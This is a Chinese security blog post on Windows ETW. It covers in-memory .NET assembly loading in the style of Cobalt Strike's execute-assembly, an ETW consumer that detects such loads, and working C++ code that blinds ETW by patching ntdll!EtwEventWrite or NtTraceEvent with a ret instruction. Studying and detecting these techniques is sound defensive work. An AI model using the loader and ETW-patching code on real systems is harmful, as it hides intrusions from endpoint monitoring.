> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jYPE1IKNtrhoBKaDxlIbHw)

******点击****蓝****字 / 关注我们******

  

前言
==

`ETW`全称为`Event Tracing for Windows`，即windows事件跟踪，它是Windows提供的原生的事件跟踪日志系统。由于采用内核层面的缓冲和日志记录机制，所以`ETW`提供了一种非常高效的事件跟踪日志解决方案，本文基于`ETW`探究其攻与防的实现

ETW
===

事件监测（`Event Instrumentation`）总会包含两个基本的实体，事件的提供者（`ETW Provider`）和消费者（`ETW Consumer`），`ETW`框架可以视为它们的中介。`ETW Provider`会预先注册到ETW框架上，提供者程序在某个时刻触发事件，并将标准化定义的事件提供给`ETW`框架。`Consumer`同样需要注册到`ETW`框架上，在注册的时候可以设置事件的删选条件和接收处理事件的回调。对于接收到的事件，如果它满足某个注册`ETW Consumer`的筛选条件，`ETW`会调用相应的回调来处理该事件

```
ETW`针对事件的处理是在某个会话（`ETW Session`）中进行的，`ETW Session`提供了一个接收、存储、处理和分发事件的执行上下文。`ETW`框架可以创建多一个会话来处理由提供者程序发送的事件，但是`ETW Session`并不会与某个单一的提供者绑定在一起，多个提供者程序可以向同一个`ETW Session`发送事件。对于接收到的事件，`ETW Session`可以将它保存在创建的日志文件中，也可以实时地分发给注册的消费者应用。`ETW`会话的开启和终止是通过 `Session`的开启和终止是通过ETW控制器（`ETW Controller`）进行管理的。除了管理`ETW Session`之外，`ETW Controller`还可以禁用或者恢复注册到某个`ETW Session`上的`ETW Provider
```

在这里，我们可以看到所有已注册的`ETW`提供者及其对应`GUID`，我们还可以看到`Microsoft-Windows-Threat-Intelligence`突出显示的提供者及其`InstrumentationManifest`位于`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\<PROVIDER_GUID>`注册表项的二进制清单文件因为这是一个`Manifest-based ETW`提供者

```
logman.exe query providers
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV3EWKo9zkAqgCb1rl8Lib9HdibG8Me7oKRecr117ibBkASdg9ia5HibTGQveYMsYEoh7d3HAZb9ib5D3IuQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")image-20220512105644794.png

  

我们可以使用以下命令获取更多详细信息并了解提供程序支持的事件类型

```
logman.exe query providers Microsoft-Windows-Threat-Intelligence
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV3EWKo9zkAqgCb1rl8Lib9HdaH1qyH4picsoODNctcx14UiaR7eZibUQ42eKYhHZaqn6CuoQucxcicM3nQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")image-20220512124646901.png

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV3EWKo9zkAqgCb1rl8Lib9HdVWWd4Rs437fytZ5Hg1OJfTrPaQUwp7llFYfh3aQeO2N4ZN6pGcCUKg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")image-20220512110110750.png

  

  

也可以`XML Manifest`使用此工具检索文件，这使我们可以更详细地了解特定`EtwTi`事件记录的参数

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512110147258.png

  

使用`x nt!EtwTi*`来查看内核里面的所有例程

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512110528763.png

  

execute-assembly
================

cs在3.11版本实现了在非托管程序中加载`.net`程序集的功能，这个功能不需要向硬盘写入文件，十分隐蔽，而且现有的`Powershell`脚本能够很容易的转换为`C#`代码，十分方便，使用到的就是`execute-assembly`这个命令，这里我们用c#程序`sharphound.exe`进行演示，这个程序用来导出域内关系并可视化

```
execute-assembly D:\Bloodhound\SharpHound.exe -c all
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220513124718747.png

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220513124807622.png

  

  

首先我们来了解一下托管程序和非托管程序，说到这里就需要提一个`CLR`。`CLR`全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。`CLR`是`.NET Framework`的主要执行引擎，作用之一是监视程序的运行：

*   • 在CLR监视之下运行的程序属于托管的代码
    
*   • 不在CLR之下，直接在裸机上运行的应用或者组件属于非托管的代码
    

托管程序与非托管程序的概念如下

> 托管代码就是Visual Basic .NET和C#编译器编译出来的代码。编译器把代码编译成中间语言(IL)，而不是能直接在你的电脑上运行的机器码。中间语言被封装在一个叫程序集 (assembly)的文件中，程序集中包含了描述你所创建的类，方法和属性(例如安全需求)的所有元数据。
> 
> 非托管代码就是在Visual Studio .NET 2002发布之前所创建的代码。例如Visual Basic 6, Visual C++ 6, 最糟糕的是，连那些依然残存在你的硬盘中、拥有超过15年历史的陈旧C编译器所产生的代码都是非托管代码。托管代码直接编译成目标计算机的机械码，这些代 码只能运行在编译出它们的计算机上，或者是其它相同处理器或者几乎一样处理器的计算机上。

再就是`Unmanaged API`，它其实是一套能将`.net`程序集加载到任意程序里面的`API`，它支持`ICorRuntimeHost Interface`和`ICLRRuntimeHost Interface`两种接口，我们看一下msdn里面的描述

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512153622148.png

  

其中`ICorRuntimeHost Interface`支持的版本有`v1.0.3705`, `v1.1.4322`, `v2.0.50727`，`v4.0.30319`，`ICLRRuntimeHost Interface`支持的版本有`v2.0.50727`,`v4.0.30319`，在实际的开发里面两种接口都是可以使用的

cs实现在非托管程序中加载主要是调用了`ICLRRuntimeHost`的接口，主要用到以下3个接口

> ICLRMetaHost
> 
> ICLRRuntimeInfo
> 
> ICLRRuntimeHost

`ICLRMetaHost`提供基于版本号返回特定版本的公共语言运行时 (CLR)、列出所有已安装的 CLR、列出在指定进程中加载的所有运行时、发现用于编译程序集的 CLR 版本、退出进程的方法干净的运行时关闭，并查询旧版 API 绑定

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512154845367.png

  

`ICLRRuntimeInfo`提供一些方法，这些方法可返回有关特定公共语言运行时 (CLR) 的信息，包括版本、目录和加载状态。此接口还提供了特定于运行时的功能，而无需初始化运行时。它包括运行时相对 LoadLibrary 方法、运行时模块特定的 GetProcAddress 方法和通过 GetInterface 方法提供的运行时提供的接口

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512154925602.png

  

```
ICLRRuntimeHost`提供与 .NET Framework 版本1中提供的 `ICorRuntimeHost`接口类似的功能，其中包含以下更改： 用于设置宿主控件接口的 `SetHostControl`方法的添加，省略提供的某些方法 `ICorRuntimeHost
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512155157965.png

  

硬盘加载
----

首先这里我们写一个`Printf`函数，使用`Console.WriteLine`接收

```
namespace etw1  
{  
    class Program  
    {  
        static int Main(String[] args)  
        {  
            return 1;  
        }  
        static int Printf(String strings)  
        {  
            Console.WriteLine(strings);  
            return 1;  
        }  
    }  
}
```

在服务端我们首先使用`CLRCreateInstance`初始化`ICLRMetaHost`接口

```
CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&iMetaHost);
```

然后调用`GetRuntime`方法获取`ICLRRuntimeInfo`接口

```
iMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&iRuntimeInfo);
```

再使用`ICLRRuntimeInfo`将 `CLR`加载到当前进程，返回运行时接口`ICLRRuntimeHost`指针

```
iRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&iRuntimeHost);
```

然后再通过`ICLRRuntimeHost.EecuteInDefaultAppDomain`执行指定程序

```
 iRuntimeHost->ExecuteInDefaultAppDomain  
    (L"F:\\C#\\etw1\\bin\\Debug\\etw1.exe", L"etw1.Program", L"Printf", L"etw1", NULL);
```

实现效果如下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512182344215.png

  

内存加载
----

内存加载相对于硬盘加载，首先是整个过程都会在内存执行而不会写入文件，隐蔽性较好，而且最终的payload为c#程序，调用powershell十分方便利用

那么我们来进行代码的实现，首先还是初始化`CLR`环境

```
 CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&iMetaHost);  
    iMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (VOID**)&iRuntimeInfo);  
    iRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&iRuntimeHost);  
    iRuntimeHost->Start();
```

然后使用`ICLRRuntimeHost`获取`AppDomain`接口指针，然后通过`AppDomain`接口的`QueryInterface`方法来查询默认应用程序域的实例指针

```
 iRuntimeHost->GetDefaultDomain(&pAppDomain);  
    pAppDomain->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512195501155.png

  

使用`Load_3(…)`从内存中读取并加载`.NET`程序集

```
 saBound[0].cElements = ASSEMBLY_LENGTH;  
    saBound[0].lLbound = 0;  
    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, saBound);  
  
    SafeArrayAccessData(pSafeArray, &pData);  
    memcpy(pData, dotnetRaw, ASSEMBLY_LENGTH);  
    SafeArrayUnaccessData(pSafeArray);  
  
    pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);  
    pAssembly->get_EntryPoint(&pMethodInfo);
```

创建安全数组并执行入口点

```
 ZeroMemory(&vRet, sizeof(VARIANT));  
    ZeroMemory(&vObj, sizeof(VARIANT));  
    vObj.vt = VT_NULL;  
  
    vPsa.vt = (VT_ARRAY | VT_BSTR);  
    args = SafeArrayCreateVector(VT_VARIANT, 0, 1);  
  
    if (argc > 1)  
    {  
        vPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);  
        for (long i = 0; i < argc; i++)  
        {  
            SafeArrayPutElement(vPsa.parray, &i, SysAllocString(argv[i]));  
        }  
  
        long idx[1] = { 0 };  
        SafeArrayPutElement(args, idx, &vPsa);  
    }  
  
    HRESULT hr = pMethodInfo->Invoke_3(vObj, args, &vRet);
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512211127018.png

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512211108513.png

  

  

检测execute-assembly
==================

一般检测`execute-assembly`都会使用windows事件跟踪，即`ETW`，例如这里启动一个`powershell`进程，通过`procexp`查看可以看到被`CLR`托管的dll

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512214614676.png

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220513125227900.png

  

  

我们可以从`processhacker`工具源码里面的`asmpage.c`(https://github.com/processhacker/processhacker/blob/master/plugins/DotNetTools/asmpage.c)源码里面查看这类工具是怎样枚举`.net`工具集的，这里挑出关键代码编译成`etw2.exe`

```
static GUID ClrRuntimeProviderGuid = { 0xe13c0d23, 0xccbc, 0x4e12, { 0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4 } };  
  
const char name[] = "dotnet trace\0";  
  
#pragma pack(1)  
typedef struct _AssemblyLoadUnloadRundown_V1  
{  
    ULONG64 AssemblyID;  
    ULONG64 AppDomainID;  
    ULONG64 BindingID;  
    ULONG AssemblyFlags;  
    WCHAR FullyQualifiedAssemblyName[1];  
} AssemblyLoadUnloadRundown_V1, * PAssemblyLoadUnloadRundown_V1;  
#pragma pack()  
  
static void NTAPI ProcessEvent(PEVENT_RECORD EventRecord) {  
  
    PEVENT_HEADER eventHeader = &EventRecord->EventHeader;  
    PEVENT_DESCRIPTOR eventDescriptor = &eventHeader->EventDescriptor;  
    AssemblyLoadUnloadRundown_V1* assemblyUserData;  
  
    switch (eventDescriptor->Id) {  
    case AssemblyDCStart_V1:  
        assemblyUserData = (AssemblyLoadUnloadRundown_V1*)EventRecord->UserData;  
        wprintf(L"[%d] - Assembly: %s\n", eventHeader->ProcessId, assemblyUserData->FullyQualifiedAssemblyName);  
        break;  
    }  
}  
  
int main(void)  
{  
    TRACEHANDLE hTrace = 0;  
    ULONG result, bufferSize;  
    EVENT_TRACE_LOGFILEA trace;  
    EVENT_TRACE_PROPERTIES* traceProp;  
  
    printf(".net_ETW_finder\n\n");  
  
    memset(&trace, 0, sizeof(EVENT_TRACE_LOGFILEA));  
    trace.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;  
    trace.LoggerName = (LPSTR)name;  
    trace.EventRecordCallback = (PEVENT_RECORD_CALLBACK)ProcessEvent;  
  
    bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(name) + sizeof(WCHAR);  
  
    traceProp = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);  
    traceProp->Wnode.BufferSize = bufferSize;  
    traceProp->Wnode.ClientContext = 2;  
    traceProp->Wnode.Flags = WNODE_FLAG_TRACED_GUID;  
    traceProp->LogFileMode = EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_USE_PAGED_MEMORY;  
    traceProp->LogFileNameOffset = 0;  
    traceProp->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);  
  
    if ((result = StartTraceA(&hTrace, (LPCSTR)name, traceProp)) != ERROR_SUCCESS) {  
        printf("[!] Error starting trace: %d\n", result);  
        return 1;  
    }  
  
    if ((result = EnableTraceEx(  
        &ClrRuntimeProviderGuid,  
        NULL,  
        hTrace,  
        1,  
        TRACE_LEVEL_VERBOSE,  
        0x8, // LoaderKeyword  
        0,  
        0,  
        NULL  
    )) != ERROR_SUCCESS) {  
        printf("[!] Error EnableTraceEx\n");  
        return 2;  
    }  
  
    hTrace = OpenTrace(&trace);  
    if (hTrace == INVALID_PROCESSTRACE_HANDLE) {  
        printf("[!] Error OpenTrace\n");  
        return 3;  
    }  
  
    result = ProcessTrace(&hTrace, 1, NULL, NULL);  
    if (result != ERROR_SUCCESS) {  
        printf("[!] Error ProcessTrace\n");  
        return 4;  
    }  
  
    return 0;  
}
```

首先cs上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512212858818.png

  

然后启动我们的监控程序

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512215550869.png

  

在beacon里面调用`SharpHound.exe`，这里需要在域内且具有`.net`环境才能够运行成功，执行以下命令

```
execute-assembly D:\Bloodhound\SharpHound.exe 1.2.3.4
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512215639441.png

  

这里就会在exe存放的位置生成以下三个文件

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512220715962.png

  

然后我们去看一下我们的监控程序，可以看到已经识别出了`SharpHound`的调用

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512215704961.png

  

这里如果想要规避检测，可以更改程序名的名字，但是这里只要修改检测方法为显示可疑方法的名称即可

```
switch (eventDescriptor->Id) {  
  case MethodLoadVerbose_V1:  
    methodUserData = (struct _MethodLoadVerbose_V1*)EventRecord->UserData;  
    WCHAR* MethodNameSpace = methodUserData->MethodNameSpace;  
    WCHAR* MethodName = (WCHAR*)(((char*)methodUserData->MethodNameSpace) + (lstrlenW(methodUserData->MethodNameSpace) * 2) + 2);  
    WCHAR* MethodSignature = (WCHAR*)(((char*)MethodName) + (lstrlenW(MethodName) * 2) + 2);  
    wprintf(L"[%d] - MethodNameSpace: %s\n", eventHeader->ProcessId, methodUserData->MethodNameSpace);  
}
```

这里通过`select-string`查找`SharpHound`方法

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512213010406.png

  

这里还是启动一下我们的`SharpHound`程序

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512213027871.png

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512213036239.png

  

  

可以看到还是被监控到了`Sharphound2.Sharphound`方法

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512213114820.png

  

规避ETW检测
=======

通过查阅资料后发现`ETW`将 `TRUE`布尔参数传递到`nt!EtwpStopTrace`函数中，以查找 `ETW`特定结构并动态修改或修补`ntdll!ETWEventWrite`或`advapi32!EventWrite`立即返回从而停止用户模式记录器

也就是说在3环`ETW`是通过`ntdll.dll`的`EtwEventWriteFull`函数实现的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512222805809.png

  

往下跟发现调用了`EtwEventWriteFull`，然后`EtwEventWriteFull`调用`EtwpEventWriteFull`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512223054442.png

  

我们继续往下看`EtwEventWriteFull`函数，调用了`NtTraceEvent`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512223238120.png

  

继续跟`NtTraceEvent`，可以发现`NtTraceEvent`通过`syscall`进入内核

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512223402930.png

  

这里我们可以打印一下地址

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220513122021737.png

  

那么我们在`EtwEventWriteFull`直接使用`0xc3`即`ret`返回，即可达到绕过的效果，首先我们通过`x64dbg`和powershell验证一下

首先使用x64dbg创建一个powershell进程，这时x64dbg会在线程初始化前下一个断点

定位到`ntdll!EtwEventWrite`

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512223941657.png

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512223957730.png

  

  

一般windows api默认使用`stdcall`(x86)调用约定，这里x64默认使用`fastcall`，即寄存器传参，被调用者清理堆栈，所以我们直接使用`ret`即`C3`返回即可

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512224033566.png

  

查看`CLR`日志已经被清空

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220512224950161.png

  

这里通过代码实现，定位到`ntdll!EtwEventWrite`函数，然后在入口处`ret`返回即可，使用`VirtualProtectEx`修改属性

```
void bypassetw()  
{  
    STARTUPINFOA si = { 0 };  
    PROCESS_INFORMATION pi = { 0 };  
    si.cb = sizeof(si);  
  
    CreateProcessA(NULL, (LPSTR)"powershell -NoExit", NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi);  
  
    unsigned char pEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };  
  
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");  
    LPVOID pEtwEventWrite = GetProcAddress(hNtdll, (LPCSTR)pEtwEventWrite);  
  
    DWORD oldProtect;  
    char patch = 0xc3;  
  
    VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);  
    WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &patch, sizeof(char), NULL);  
  
    VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL);  
    ResumeThread(pi.hThread);  
    CloseHandle(pi.hProcess);  
    CloseHandle(pi.hThread);  
    FreeLibrary(hNtdll);  
    return 0;  
  
}
```

实现效果如下，可以看到起了一个powershell进程，查看`CLR`日志也被清空

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220513104316834.png

  

这里可能某些EDR会hook`EtwEventWrite`这个函数，那么我们直接往`syscall`进0环的函数去挂钩，代码如下

```
unsigned char sNtTraceEvent[] = { 'N','t','T','r','a','c','e','E','v','e','n','t', 0};  
LPVOID pNtTraceEvent = GetProcAddress(hNtdll, (LPCSTR)sEtwEventWrite);
```

可以看到`CLR`日志也被清空

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image-20220513123017709.png

  

  

**推荐阅读：**  

[CodeQL能找到log4shell(CVE-2021-44228)漏洞吗？](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247486385&idx=1&sn=ae4213abbec74a489b8d2473562a7a36&chksm=c1711a20f6069336435091a20546f9428272eb97df55e73c1f7d90241d8a7b5761712922bcc4&scene=21#wechat_redirect)  

[浅谈hook攻防](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247486543&idx=1&sn=06daadf8c581a199482ea38e48976510&chksm=c1711ddef60694c81b45cb8601036b4b0ead632c25ca0a9e5bcb9673683044a0f5e03ca3d1fd&scene=21#wechat_redirect)  

[HOW DO YOU ACTUALLY FIND BUGS?（译文）](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247487072&idx=1&sn=188bf50e2a983b6a1990bb356f2c3f18&chksm=c1711ff1f60696e78e3d4099df2c989f4a9dcc092def5fbec3c6522e40a63d9359f4645bd19c&scene=21#wechat_redirect)  

[对抗无落地的shellcode注入](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247486956&idx=1&sn=272614e6cf970dd0c44500a7259a149c&chksm=c1711c7df606956b3861b1de6035ca5fd894830a2e57e85f55b388bd38335b147fc5af0dc6b3&scene=21#wechat_redirect)  

[渗透测试工具 OWASP ZAP 的 RCE 反制](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247484026&idx=1&sn=64b84911f80e3b0a218ec09be10ac355&chksm=c17113ebf6069afdefab8efc3a90d9c2b93afb6b8d943bdfbc1d03a188b7861067b753875aa9&scene=21#wechat_redirect)

  

  

* * *

  

  

跳跳糖是一个安全社区，旨在为安全人员提供一个能让思维跳跃起来的交流平台。

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

  

阅读更多原创技术文章，戳“阅读全文”

  

  

加下方wx，拉你一起进群学习

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

SEH异常之编译器原理探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500921&idx=1&sn=0229a056fb1a180a2027cfed2f5fb37f&chksm=ce677ec5f910f7d3aab0dbaefdc105aa9b6cec72d149f4909b3cd6f1371eaee1e9fc5ba07203&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（三）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

[

初探栈溢出



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500720&idx=1&sn=b431f7b842f83ba769aa21b6f72a9874&chksm=ce67790cf910f01a10e45f7de48782e180acaf0a8440e02053cbfc82b8e15f00cc9534cf77fe&scene=21#wechat_redirect)

[

windows环境下的自保护探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500695&idx=1&sn=ba5ee681ab01b3e33b66d7562d8aaa19&chksm=ce67792bf910f03d5e828822de773c3c82f8f2fc38c2e875f17ffd01d06294ecbea5c618cc2f&scene=21#wechat_redirect)

[

记一次内部红队渗透——定位张三



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500656&idx=1&sn=654bbdcc1f6c5da944740c3519c3fc5a&chksm=ce6779ccf910f0daddbcbe77b77a0f44a2450dbd82f5e1c4269c311fe29858e76399ea625102&scene=21#wechat_redirect)

[

对抗无落地的shellcode注入



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500063&idx=1&sn=911e115c9c99ea88a582a947737a0cc1&chksm=ce677ba3f910f2b51cce3135c7fa709067498098e9d4b2de5f8df66f8760853d8ce8b74ea978&scene=21#wechat_redirect)

[

spring常见漏洞总结



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500014&idx=1&sn=7122283dde861deab7aba042ffe3b05f&chksm=ce677a52f910f3447af0e86ab4fc9e65324bc2f1de49032114480b92306a18a5c1c2661a422c&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（一）



